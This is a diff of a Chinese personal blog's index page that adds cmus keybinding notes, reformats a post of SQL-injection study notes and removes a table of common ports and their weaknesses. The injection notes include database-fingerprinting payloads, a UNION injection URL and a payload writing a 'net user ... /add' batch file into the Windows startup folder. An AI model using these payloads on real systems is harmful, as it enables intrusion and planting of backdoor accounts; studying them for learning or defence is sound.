@@ -282,6 +282,93 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-cmus使用" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/12/30/cmus使用/" class="article-date">
+      <time datetime="2018-12-30T13:43:13.000Z" itemprop="datePublished">2018-12-30</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/12/30/cmus使用/">cmus使用</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <ul>
+<li>[q]             quit -i                         退出</li>
+<li>[^C]            :quit<enter> to exit cmus.      退出（^就是ctrl的意思）</enter></li>
+<li>[b]             player-next                     下一首</li>
+<li>[c]             player-pause                    暂停</li>
+<li>[ x]             player-play                     播放</li>
+<li>[z]             player-prev                     前一首</li>
+<li>[v]             player-stop                     停止</li>
+<li>[^L]            refresh                         刷新</li>
+<li>[n]             search-next                     查找下一个</li>
+<li>[N]             search-prev                     查找上一个</li>
+<li>[.]             seek +1m                        快进</li>
+<li>[l], [right]    seek +5                         快快进</li>
+<li>[,]             seek -1m                        快退</li>
+<li>[h], [left]     seek -5                         快快退</li>
+<li>[M]             toggle play_library             切换到playlist</li>
+<li>[o]             toggle play_sorted              切换成all from sorted library</li>
+<li>[^R]            toggle repeat_current           对当前循环</li>
+<li>[t]             toggle show_remaining_time      显示剩余时间（默认是显示播放时间）</li>
+<li>[s]             toggle shuffle                  乱序播放</li>
+<li>[i]             toggle show-hidden              显示/取消显示隐藏文件</li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/Linux/">Linux</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux工具/">linux工具</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
     <article id="post-linux命令行与脚本编程笔记" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -505,19 +592,15 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <ul>
-<li>定义： 攻击者利用应用程序根据提交的数据动态生成sal命令的特性，在url、表单域或者其他的输入域中输入自己的sql命令，改变sql命令的操作，将被修改的sql命令注入到后端数据库引擎中执行。</li>
-<li>危害：<ol>
+        <h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><p>  攻击者利用应用程序根据提交的数据动态生成sal命令的特性，在url、表单域或者其他的输入域中输入自己的sql命令，改变sql命令的操作，将被修改的sql命令注入到后端数据库引擎中执行。</p>
+<h5 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h5><ol>
 <li>数据库信息泄漏</li>
 <li>网页篡改</li>
 <li>挂马</li>
 <li>服务器被远程控制</li>
 <li>瘫痪全系统</li>
 </ol>
-</li>
-</ul>
-<ul>
-<li>常用sql语句<ul>
+<h5 id="常用sql语句"><a href="#常用sql语句" class="headerlink" title="常用sql语句"></a>常用sql语句</h5><ul>
 <li>判断数据库<ul>
 <li><code>and exsits(select * from msysobjects)&gt;0</code> access</li>
 <li><code>and exsits(select * from sysobjects)&gt;0</code> sqlserver</li>
@@ -540,11 +623,8 @@
 </ul>
 </li>
 </ul>
-</li>
-</ul>
+<h5 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h5><p>  偏移注入的产生主要是用来解决表名猜到，列名猜不到的情况。使用的sql语句为<br>  <code>http://127.0.0.1:33/0/simple.asp?id=22 union select 1,2,3,4,5,6,7,8 from admin</code></p>
 <ul>
-<li><p>偏移注入<br>偏移注入的产生主要是用来解决表名猜到，列名猜不到的情况。使用的sql语句为<br><code>http://127.0.0.1:33/0/simple.asp?id=22 union select 1,2,3,4,5,6,7,8 from admin</code></p>
-</li>
 <li><p>利用注入漏洞执行系统命令</p>
 <ul>
 <li><p>第一种方法： 需要有系统权限<br><code>and 1 = 2 union select 1, &quot;net user seven 123 /add&quot;, 2,3,4 into outfile &#39;C://Documments and Settings/Administrator/[开始] 菜单/程序/启动/1.bat&#39;</code></p>
@@ -554,7 +634,11 @@
 </ul>
 </li>
 </ul>
-
+<h5 id="ORACLE"><a href="#ORACLE" class="headerlink" title="ORACLE"></a>ORACLE</h5><ol>
+<li>执行java代码</li>
+<li>补充。。。。</li>
+</ol>
+<h4 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h4>
       
     </div>
     
@@ -1020,215 +1104,6 @@
       
     <div class="article-tag tagcloud">
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/工具/">工具</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-常见端口" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2018/12/17/常见端口/" class="article-date">
-      <time datetime="2018-12-17T13:38:32.000Z" itemprop="datePublished">2018-12-17</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2018/12/17/常见端口/">常见端口</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <table>
-<thead>
-<tr>
-<th style="text-align:center">端口号</th>
-<th style="text-align:center">描述</th>
-<th style="text-align:center">漏洞</th>
-<th style="text-align:center">工具</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">21</td>
-<td style="text-align:center">ftp协议代理服务器常用端口</td>
-<td style="text-align:center">默认用户名密码：anonymous:anonymous    , 爆破</td>
-<td style="text-align:center"></td>
-</tr>
-<tr>
-<td style="text-align:center">22</td>
-<td style="text-align:center">ssh scp</td>
-<td style="text-align:center">暴力破解</td>
-<td style="text-align:center">爆破工具：hydra，medusa;连接工具：putty，winscp</td>
-</tr>
-<tr>
-<td style="text-align:center">23</td>
-<td style="text-align:center">telnet协议代理服务器常用端口</td>
-<td style="text-align:center">爆破</td>
-<td style="text-align:center"></td>
-</tr>
-<tr>
-<td style="text-align:center">25</td>
-<td style="text-align:center">smtp 默认的端口（木马Antigen Email Password Sender, Haebu Coceda, Shtrilitz Stealth , WinPC ,WinSpy都开放这个端口）</td>
-<td style="text-align:center">邮件欺骗，垃圾邮件转发、使用VRFY枚举用户列表</td>
-<td style="text-align:center"></td>
-</tr>
-<tr>
-<td style="text-align:center">31</td>
-<td style="text-align:center">木马Master Paradise、Hackers Pardadise 开放</td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-</tr>
-<tr>
-<td style="text-align:center">53/udp</td>
-<td style="text-align:center">DNS服务</td>
-<td style="text-align:center">DNS域传送、针对dns的拒绝服务攻击、枚举二级域名，泄漏域名信息</td>
-<td style="text-align:center">dnsenum, nslookup, dig, fierce</td>
-</tr>
-<tr>
-<td style="text-align:center">69</td>
-<td style="text-align:center">tftp默认端口</td>
-<td style="text-align:center">爆破，未授权访问</td>
-<td style="text-align:center"></td>
-</tr>
-<tr>
-<td style="text-align:center">80/443/3128/8080/8081/8443/9081</td>
-<td style="text-align:center">http协议代理服务器常用端口</td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-</tr>
-<tr>
-<td style="text-align:center">109</td>
-<td style="text-align:center">POP3服务</td>
-<td style="text-align:center">缓冲区溢出</td>
-<td style="text-align:center"></td>
-</tr>
-<tr>
-<td style="text-align:center">111</td>
-<td style="text-align:center">RPC远程过程调用协议</td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-</tr>
-<tr>
-<td style="text-align:center">123/udp</td>
-<td style="text-align:center">NTP网络时间协议</td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-</tr>
-<tr>
-<td style="text-align:center">137/139/445</td>
-<td style="text-align:center">SMB通信协议</td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-</tr>
-<tr>
-<td style="text-align:center">161/udp</td>
-<td style="text-align:center">SNMP简单网络管理协议</td>
-<td style="text-align:center">默认社区字符串，枚举MIB</td>
-<td style="text-align:center">snmpwalk，snmpenum</td>
-</tr>
-<tr>
-<td style="text-align:center">1080/udp</td>
-<td style="text-align:center">qq默认端口</td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-</tr>
-<tr>
-<td style="text-align:center">1433/udp/tcp</td>
-<td style="text-align:center">sqlserver默认端口</td>
-<td style="text-align:center">暴力破解</td>
-<td style="text-align:center"></td>
-</tr>
-<tr>
-<td style="text-align:center">1521</td>
-<td style="text-align:center">oracle数据库默认端口</td>
-<td style="text-align:center">暴力破解，枚举数据库工具</td>
-<td style="text-align:center">枚举工具：Tnsver、Tnscmd</td>
-</tr>
-<tr>
-<td style="text-align:center">3306</td>
-<td style="text-align:center">mysql的默认端口</td>
-<td style="text-align:center">暴力破解</td>
-<td style="text-align:center"></td>
-</tr>
-<tr>
-<td style="text-align:center">3389</td>
-<td style="text-align:center">win2003远程登录默认端口(RDP协议)</td>
-<td style="text-align:center">暴力破解</td>
-<td style="text-align:center"></td>
-</tr>
-<tr>
-<td style="text-align:center">3389</td>
-<td style="text-align:center">mstsc的默认端口</td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-</tr>
-<tr>
-<td style="text-align:center">5060</td>
-<td style="text-align:center">SIP会话初始协议</td>
-<td style="text-align:center"></td>
-<td style="text-align:center">Sipflanker,Sipscan</td>
-</tr>
-<tr>
-<td style="text-align:center">8080</td>
-<td style="text-align:center">tomcat默认的端口号</td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-</tr>
-<tr>
-<td style="text-align:center">9090</td>
-<td style="text-align:center">websphere的默认端口</td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-</tr>
-</tbody>
-</table>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原理/">原理</a></li></ul>
     </div>
 
       
